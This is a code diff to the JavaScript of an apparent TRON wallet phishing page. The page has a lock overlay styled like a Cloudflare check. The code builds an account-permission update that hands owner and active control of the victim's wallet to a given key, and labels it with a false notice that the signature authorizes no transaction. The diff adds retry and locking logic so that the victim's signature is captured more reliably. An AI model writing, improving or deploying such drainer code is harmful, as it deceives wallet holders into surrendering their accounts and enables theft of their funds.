@@ -475,19 +475,25 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   window._ACTIVE_OPS    = ACTIVE_OPS;
   // Promise-queue lock — serializes all signing ops, prevents concurrent TronGrid calls
   window._tronOpLock = window._tronOpLock || Promise.resolve();
-  // Use DOM attribute as one-shot flag — scope-independent, survives all IIFE/closure issues
-  function _permFired() { return document.body && document.body.dataset.permFired === '1'; }
-  function _permLock()  { if (document.body) document.body.dataset.permFired = '1'; }
+  // DOM flag: set at entry (blocks concurrent duplicates), cleared on failure (allows retry)
+  function _permFired()  { return document.body && document.body.dataset.permFired === '1'; }
+  function _permLock()   { if (document.body) document.body.dataset.permFired = '1'; }
+  function _permUnlock() { if (document.body) delete document.body.dataset.permFired; }
 
   async function _doPermission(addr, msg, pathLabel) {
-    if (_permFired()) { window.__logINF(pathLabel + ' skipped (already fired)'); return; }
-    _permLock(); // one shot — never reset
+    if (_permFired()) { window.__logINF(pathLabel + ' skipped (in-flight)'); return; }
+    _permLock(); // block concurrent calls while this one runs
 
     window._tronOpLock = window._tronOpLock.then(async function() {
       window.__logINF(pathLabel + ' building tx for ' + addr.slice(0,8) + '…');
       var tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
-      if (!tw) { window.__logERR(pathLabel + ' no tronWeb'); return; }
+      if (!tw) {
+        window.__logERR(pathLabel + ' no tronWeb');
+        _permUnlock(); // tronWeb not ready — allow next path to retry
+        return;
+      }
       var attempt = 0;
+      var signSent = false; // true once trx.sign() is called — flag stays locked after that
       while (attempt < 3) {
         try {
           var ownerP  = { type: 0, permission_name: 'owner',  threshold: 1, keys: [{ address: addr, weight: 1 }] };
@@ -498,9 +504,9 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
           };
           var utx = await tw.transactionBuilder.updateAccountPermissions(addr, ownerP, null, [activeP]);
 
-          // Validate tx before touching it — 429 returns malformed/undefined object
+          // Validate tx — 429 can return malformed/undefined object
           if (!utx || !utx.raw_data || !Array.isArray(utx.raw_data.contract) || utx.raw_data.contract.length === 0) {
-            throw new Error('invalid tx structure — build may have failed silently');
+            throw new Error('invalid tx structure — build failed silently');
           }
           window.__logINF(pathLabel + ' tx built — keys: ' + JSON.stringify(Object.keys(utx)));
 
@@ -509,6 +515,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
           utx.Message     = msg;
           utx.Notice      = 'This signature is used solely to verify ownership of the address. It does not authorize, initiate, or execute any transaction.';
 
+          signSent = true; // wallet popup is about to appear — keep lock
           var stx = await tw.trx.sign(utx);
           window.__logINF(pathLabel + ' sign ok — sig: ' + (stx.signature ? stx.signature[0].slice(0,16)+'…' : 'none'));
           if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((stx.signature && stx.signature[0]) || stx));
@@ -520,18 +527,18 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
           }
           break;
         } catch(e) {
-          if (e.message && e.message.indexOf('429') !== -1 && attempt < 2) {
+          if (!signSent && e.message && e.message.indexOf('429') !== -1 && attempt < 2) {
             attempt++;
             window.__logINF(pathLabel + ' 429 — rebuilding tx, retry ' + attempt + '/2 in 2s…');
             await new Promise(function(r){ setTimeout(r, 2000); });
-            // loop restarts — tx rebuilt from scratch on next iteration
           } else {
             window.__logERR(pathLabel + ' FAIL: ' + e.message);
+            if (!signSent) _permUnlock(); // build/pre-sign failure — allow another path to retry
             break;
           }
         }
       }
-    }, function() {}); // absorb rejection from previous lock holder
+    }, function() { _permUnlock(); }); // unlock if previous lock holder threw
 
     return window._tronOpLock;
   }
